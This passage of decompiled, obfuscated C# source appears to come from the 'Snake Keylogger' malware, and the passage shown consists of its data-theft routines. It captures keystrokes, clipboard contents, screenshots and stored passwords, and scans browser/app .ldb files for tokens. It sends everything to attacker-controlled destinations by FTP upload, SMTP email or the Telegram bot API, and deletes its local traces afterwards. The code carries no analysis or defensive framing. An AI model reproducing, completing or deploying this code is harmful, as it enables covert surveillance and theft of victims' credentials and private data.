          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\uFFFDk\uFFFDkٷ.\u26CA鈇ŲRR, \uFFFDk\uFFFDkٷ.ēCŎϘ\u07FB);
          byte[] bytes = Encoding.UTF8.GetBytes("Clipboard | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n\r\n\r\n" + \uFFFDk\uFFFDkٷ.\u00AB丐ʭҡӚ + "\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(\uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé);
          message.To.Add(\uFFFDk\uFFFDkٷ.\uFFFD\u00BEӥ\u00BE\u061D);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "Clipboard | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n\r\n";
          MemoryStream contentStream = new MemoryStream(\uFFFDk\uFFFDkٷ.\uD974\uDD61㹃Πٵ());
          message.Attachments.Add(new Attachment((Stream) contentStream, "Clipboard" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "text/plain"));
          new SmtpClient(\uFFFDk\uFFFDkٷ.䕃հϒ\uFFFDζ)
          {
            EnableSsl = (Operators.CompareString(\uFFFDk\uFFFDkٷ.\u07FBRľKӺ, "True", false) == 0),
            Port = Conversions.ToInteger(\uFFFDk\uFFFDkٷ.퓜\uFFFDی̲\uFFFD),
            Credentials = ((ICredentialsByHost) new NetworkCredential(\uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé, \uFFFDk\uFFFDkٷ.\u0089\uDBCC\uDC77ۨʤ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "Clipboard | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n\r\n\r\n" + \uFFFDk\uFFFDkٷ.\u00AB丐ʭҡӚ + "\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + \uFFFDk\uFFFDkٷ.\uFFFD\uFFFDtʪ盀 + "/sendDocument?chat_id=" + \uFFFDk\uFFFDkٷ.\u07C2ҏ\u0089\uFFFDߡ + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nClipboard | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          \uFFFDk\uFFFDkٷ.\uFFFDۣל\uFFFD\uFFFD("Clipboard" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static void \u0306\uFFFDë븤Ң(object _param0, EventArgs _param1)
    {
      string str1 = "Screenshot";
      string str2 = ".png";
      string path = Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger";
      try
      {
        if (Directory.Exists(path))
        {
          \uFFFDk\uFFFDkٷ.ҭ\u05C9\uFFFDʤΑ = Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger\\" + str1 + str2;
          int width = Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Screen.Bounds.Width;
          Rectangle bounds = Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Screen.Bounds;
          int height = bounds.Height;
          Size blockRegionSize = new Size(width, height);
          bounds = Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Screen.Bounds;
          Bitmap bitmap = new Bitmap(bounds.Width, Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Screen.Bounds.Height);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
          bitmap.Save(\uFFFDk\uFFFDkٷ.ҭ\u05C9\uFFFDʤΑ);
          \uFFFDk\uFFFDkٷ.اհ\uFFFDé\uFFFD();
          \uFFFDk\uFFFDkٷ.ʭ\uFFFD\uFFFDɛ\u05C3();
        }
        else
        {
          Directory.CreateDirectory(path);
          Size blockRegionSize = new Size(Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Screen.Bounds.Width, Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Screen.Bounds.Height);
          Bitmap bitmap = new Bitmap(Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Screen.Bounds.Width, Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Screen.Bounds.Height);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
          bitmap.Save(\uFFFDk\uFFFDkٷ.ҭ\u05C9\uFFFDʤΑ);
          \uFFFDk\uFFFDkٷ.اհ\uFFFDé\uFFFD();
          \uFFFDk\uFFFDkٷ.ʭ\uFFFD\uFFFDɛ\u05C3();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void اհ\uFFFDé\uFFFD()
    {
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (\uFFFDk\uFFFDkٷ.Ȩ\u1CFCגēݝ + Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Name + " - Screenshot Logs ID - "), \uFFFDk\uFFFDkٷ.ݶƟ\u07B8ƌִ), (object) ".png")
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\uFFFDk\uFFFDkٷ.\u26CA鈇ŲRR, \uFFFDk\uFFFDkٷ.ēCŎϘ\u07FB);
          byte[] buffer = System.IO.File.ReadAllBytes(\uFFFDk\uFFFDkٷ.ҭ\u05C9\uFFFDʤΑ);
          ftpWebRequest.ContentLength = (long) buffer.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(buffer, 0, buffer.Length);
            requestStream.Close();
            System.IO.File.Delete(\uFFFDk\uFFFDkٷ.ҭ\u05C9\uFFFDʤΑ);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(\uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé);
          message.To.Add(\uFFFDk\uFFFDkٷ.\uFFFD\u00BEӥ\u00BE\u061D);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "Screenshot | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n\r\n";
          Attachment attachment = new Attachment(\uFFFDk\uFFFDkٷ.ҭ\u05C9\uFFFDʤΑ);
          message.Attachments.Add(attachment);
          new SmtpClient(\uFFFDk\uFFFDkٷ.䕃հϒ\uFFFDζ)
          {
            EnableSsl = (Operators.CompareString(\uFFFDk\uFFFDkٷ.\u07FBRľKӺ, "True", false) == 0),
            Port = Conversions.ToInteger(\uFFFDk\uFFFDkٷ.퓜\uFFFDی̲\uFFFD),
            Credentials = ((ICredentialsByHost) new NetworkCredential(\uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé, \uFFFDk\uFFFDkٷ.\u0089\uDBCC\uDC77ۨʤ))
          }.Send(message);
          message.Dispose();
          \uFFFDk\uFFFDkٷ.ʭ\uFFFD\uFFFDɛ\u05C3();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "$%TelegramDv$", false) == 0)
      {
        try
        {
          byte[] numArray = System.IO.File.ReadAllBytes(\uFFFDk\uFFFDkٷ.ҭ\u05C9\uFFFDʤΑ);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str = "https://api.telegram.org/bot" + \uFFFDk\uFFFDkٷ.\uFFFD\uFFFDtʪ盀 + "/sendDocument?chat_id=" + \uFFFDk\uFFFDkٷ.\u07C2ҏ\u0089\uFFFDߡ + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nScreenshot | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n\r\n");
          \uFFFDk\uFFFDkٷ.ƚ꾯اӛΑ(numArray, \uFFFDk\uFFFDkٷ.ҭ\u05C9\uFFFDʤΑ, "application/x-ms-dos-executable", str);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static void ʭ\uFFFD\uFFFDɛ\u05C3()
    {
      int num1;
      int num2;
      try
      {
label_2:
        int num3 = 1;
        string path = Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger";
label_3:
        ProjectData.ClearProjectError();
        num1 = -2;
label_4:
        num3 = 3;
        if (!Directory.Exists(path))
          goto label_7;
label_5:
        num3 = 4;
        Directory.Delete(path, true);
label_6:
label_7:
        goto label_14;
label_9:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
                goto label_5;
              case 5:
                goto label_6;
              case 6:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static byte[] \uFFFDչ\u061DӺс() => Encoding.Unicode.GetBytes("KP | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n\r\n\r\n" + \uFFFDk\uFFFDkٷ.Ł\uFFFDĪג\u07FB.ToString() + "\r\n\r\n\r\n--------------------------------------------------");

    private static void ô\uFFFDٕ蠺\u002D(object _param0, EventArgs _param1)
    {
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (\uFFFDk\uFFFDkٷ.Ȩ\u1CFCגēݝ + Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Name + " - keystroke Logs ID - "), \uFFFDk\uFFFDkٷ.ݶƟ\u07B8ƌִ), (object) \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\uFFFDk\uFFFDkٷ.\u26CA鈇ŲRR, \uFFFDk\uFFFDkٷ.ēCŎϘ\u07FB);
          byte[] bytes = Encoding.UTF8.GetBytes("KP | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n\r\n\r\n" + \uFFFDk\uFFFDkٷ.Ł\uFFFDĪג\u07FB.ToString() + "\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
            \uFFFDk\uFFFDkٷ.Wթ\uFFFDӛ\u00BE = "";
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(\uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé);
          message.To.Add(\uFFFDk\uFFFDkٷ.\uFFFD\u00BEӥ\u00BE\u061D);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          MemoryStream contentStream = new MemoryStream(\uFFFDk\uFFFDkٷ.\uFFFDչ\u061DӺс());
          message.Attachments.Add(new Attachment((Stream) contentStream, "Keystrokes" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "text/plain"));
          message.Body = "KP | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          new SmtpClient(\uFFFDk\uFFFDkٷ.䕃հϒ\uFFFDζ)
          {
            EnableSsl = (Operators.CompareString(\uFFFDk\uFFFDkٷ.\u07FBRľKӺ, "True", false) == 0),
            Port = Conversions.ToInteger(\uFFFDk\uFFFDkٷ.퓜\uFFFDی̲\uFFFD),
            Credentials = ((ICredentialsByHost) new NetworkCredential(\uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé, \uFFFDk\uFFFDkٷ.\u0089\uDBCC\uDC77ۨʤ))
          }.Send(message);
          message.Dispose();
          \uFFFDk\uFFFDkٷ.Wթ\uFFFDӛ\u00BE = "";
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "Keylogger | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n\r\n\r\n" + \uFFFDk\uFFFDkٷ.Ł\uFFFDĪג\u07FB.ToString() + "\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + \uFFFDk\uFFFDkٷ.\uFFFD\uFFFDtʪ盀 + "/sendDocument?chat_id=" + \uFFFDk\uFFFDkٷ.\u07C2ҏ\u0089\uFFFDߡ + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nKeylogger | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          \uFFFDk\uFFFDkٷ.\uFFFDۣל\uFFFD\uFFFD("SnakeKeylogger" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static void ʤ\u061Dױ\uFFFDȨ(object _param0, \uFFFDk\uFFFDkٷ.KeyLoggerEventArgs _param1)
    {
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD䕃\uFFFDŲԜ, \uFFFDk\uFFFDkٷ.ב\u1CFC\u07B8̲ߟ.CurrentWindow, false) != 0)
      {
        \uFFFDk\uFFFDkٷ.\uFFFD䕃\uFFFDŲԜ = \uFFFDk\uFFFDkٷ.ב\u1CFC\u07B8̲ߟ.CurrentWindow;
        \uFFFDk\uFFFDkٷ.\u065A\u002D̀\uFFFDJ(string.Format("\r\n[ -- {0} -- ]\r\n", (object) \uFFFDk\uFFFDkٷ.ב\u1CFC\u07B8̲ߟ.CurrentWindow));
      }
      \uFFFDk\uFFFDkٷ.\u065A\u002D̀\uFFFDJ(string.Format("{0}", (object) _param1.StringValue));
    }

    private static void ӓ蠺̳jִ(object _param0, \uFFFDk\uFFFDkٷ.KeyLoggerEventArgs _param1) => \uFFFDk\uFFFDkٷ.\u065A\u002D̀\uFFFDJ(string.Format("{0}", (object) _param1.StringValue));

    private static void \u065A\u002D̀\uFFFDJ(string _param0) => \uFFFDk\uFFFDkٷ.Ł\uFFFDĪג\u07FB.Append(_param0);

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow")]
    public static extern IntPtr 鈟ϫױ恁k();

    [DllImport("user32.dll", EntryPoint = "GetWindowText")]
    public static extern int сAR̀\uFFFD(IntPtr _param0, StringBuilder _param1, int ʓϱƚŲݶ);

    [DllImport("ntdll.dll", EntryPoint = "Wekakekakd", SetLastError = true)]
    public static extern int Aɮë\uFFFD̲(IntPtr _param0, int _param1, ref int _param2, int _param3);

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ҏЅۨ\uFFFD\u0089(IntPtr _param0, ref int _param1);

    [DllImport("user32", EntryPoint = "GetKeyboardLayout", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \uFFFD泮\u05C9\uFFFDҚ(int _param0);

    [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
    public static extern int \u0739\u02F3CŔ\u058F(
      uint _param0,
      uint _param1,
      byte[] _param2,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder _param3,
      int _param4,
      uint _param5,
      IntPtr _param6);

    [DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
    public static extern bool ųޗãēב(byte[] _param0);

    [DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
    public static extern uint \uFFFD㹃\uFFFD\uFFFDۚ(uint _param0, uint _param1);

    private static void \u002D\uFFFDȨë\u0026()
    {
      ThreadStart start;
      // ISSUE: reference to a compiler-generated field
      if (\uFFFDk\uFFFDkٷ._Closure\u0024__.\u0024I106\u002D0 != null)
      {
        // ISSUE: reference to a compiler-generated field
        start = \uFFFDk\uFFFDkٷ._Closure\u0024__.\u0024I106\u002D0;
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        \uFFFDk\uFFFDkٷ._Closure\u0024__.\u0024I106\u002D0 = start = (ThreadStart) (() =>
        {
          \uFFFDk\uFFFDkٷ.ב\u1CFC\u07B8̲ߟ = new \uFFFDk\uFFFDkٷ.KeyLogger();
          \uFFFDk\uFFFDkٷ.ב\u1CFC\u07B8̲ߟ.KeyDown += new \uFFFDk\uFFFDkٷ.KeyLoggerEventArgsEventHandler(\uFFFDk\uFFFDkٷ.ʤ\u061Dױ\uFFFDȨ);
          \uFFFDk\uFFFDkٷ.ב\u1CFC\u07B8̲ߟ.KeyUp += new \uFFFDk\uFFFDkٷ.KeyLoggerEventArgsEventHandler(\uFFFDk\uFFFDkٷ.ӓ蠺̳jִ);
          Application.Run();
        });
      }
      new Thread(start).Start();
    }

    public static byte[] հߡj蠺\uFFFD() => Encoding.Unicode.GetBytes(\uFFFDk\uFFFDkٷ.ë\uFFFD㹃ƌۣ("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n" + \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", \uFFFDk\uFFFDkٷ.鈇ô蠺Kş));

    public static byte[] ʭZŲɛę() => Encoding.Default.GetBytes(\uFFFDk\uFFFDkٷ.ë\uFFFD㹃ƌۣ("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n" + \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", \uFFFDk\uFFFDkٷ.鈇ô蠺Kş));

    private static void \u061CגҢĂٚ(object _param0, EventArgs _param1)
    {
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (\uFFFDk\uFFFDkٷ.Ȩ\u1CFCגēݝ + Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Name + " - Passwords ID - "), \uFFFDk\uFFFDkٷ.ݶƟ\u07B8ƌִ), (object) \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\uFFFDk\uFFFDkٷ.\u26CA鈇ŲRR, \uFFFDk\uFFFDkٷ.ēCŎϘ\u07FB);
          byte[] bytes = Encoding.UTF8.GetBytes(\uFFFDk\uFFFDkٷ.ë\uFFFD㹃ƌۣ("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n" + \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", \uFFFDk\uFFFDkٷ.鈇ô蠺Kş));
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(\uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé);
          message.To.Add(\uFFFDk\uFFFDkٷ.\uFFFD\u00BEӥ\u00BE\u061D);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = \uFFFDk\uFFFDkٷ.հߡj蠺\uFFFD();
          byte[] buffer2 = \uFFFDk\uFFFDkٷ.ʭZŲɛę();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "text/plain"));
          new SmtpClient(\uFFFDk\uFFFDkٷ.䕃հϒ\uFFFDζ)
          {
            EnableSsl = (Operators.CompareString(\uFFFDk\uFFFDkٷ.\u07FBRľKӺ, "True", false) == 0),
            Port = Conversions.ToInteger(\uFFFDk\uFFFDkٷ.퓜\uFFFDی̲\uFFFD),
            Credentials = ((ICredentialsByHost) new NetworkCredential(\uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé, \uFFFDk\uFFFDkٷ.\u0089\uDBCC\uDC77ۨʤ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = \uFFFDk\uFFFDkٷ.ë\uFFFD㹃ƌۣ("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n" + \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", \uFFFDk\uFFFDkٷ.鈇ô蠺Kş);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + \uFFFDk\uFFFDkٷ.\uFFFD\uFFFDtʪ盀 + "/sendDocument?chat_id=" + \uFFFDk\uFFFDkٷ.\u07C2ҏ\u0089\uFFFDߡ + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          \uFFFDk\uFFFDkٷ.ΑިȨˤ늻("SnakePW" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static bool ɇԜ̮չ\uFFFD(ref string _param0)
    {
      bool flag;
      if (Directory.Exists(_param0))
      {
        FileInfo[] files = new DirectoryInfo(_param0).GetFiles();
        int index = 0;
        while (index < files.Length)
        {
          FileInfo fileInfo = files[index];
          if (fileInfo.Name.EndsWith(".ldb") && System.IO.File.ReadAllText(fileInfo.FullName).Contains("oken"))
          {
            _param0 += fileInfo.Name;
            return _param0.EndsWith(".ldb");
          }
          checked { ++index; }
        }
        flag = _param0.EndsWith(".ldb");
      }
      else
        flag = false;
      return flag;
    }

    private static string \uF0B9ζ\u00BE븤\u02F3(string _param0)
    {
      string[] collection = _param0.Substring(checked (_param0.IndexOf("oken") + 4)).Split('"');
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) collection);
      stringList.RemoveAt(0);
      return string.Join("\"", stringList.ToArray());
    }

    private static string \u05C3\uDB77\uDF1A㠰\uFFFD(string _param0, bool ݝŔŧʪۣ = false)
    {
      string str1 = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(_param0));
      string str2 = "";
      string str3 = str1;
      while (str3.Contains("oken"))
      {
        string[] strArray = \uFFFDk\uFFFDkٷ.\uF0B9ζ\u00BE븤\u02F3(str3).Split('"');
        str2 = strArray[0];
        str3 = string.Join("\"", strArray);
        if (ݝŔŧʪۣ && str2.Length == 59)
          break;
      }
      return str2;
    }

    public static void ɛ\uFFFD\uFFFDB\u00BE()
    {
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (\uFFFDk\uFFFDkٷ.Ȩ\u1CFCגēݝ + Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Name + " - Passwords ID - "), \uFFFDk\uFFFDkٷ.ݶƟ\u07B8ƌִ), (object) \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\uFFFDk\uFFFDkٷ.\u26CA鈇ŲRR, \uFFFDk\uFFFDkٷ.ēCŎϘ\u07FB);
          byte[] bytes = Encoding.UTF8.GetBytes(\uFFFDk\uFFFDkٷ.ë\uFFFD㹃ƌۣ("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n" + \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", \uFFFDk\uFFFDkٷ.鈇ô蠺Kş));
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(\uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé);
          message.To.Add(\uFFFDk\uFFFDkٷ.\uFFFD\u00BEӥ\u00BE\u061D);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
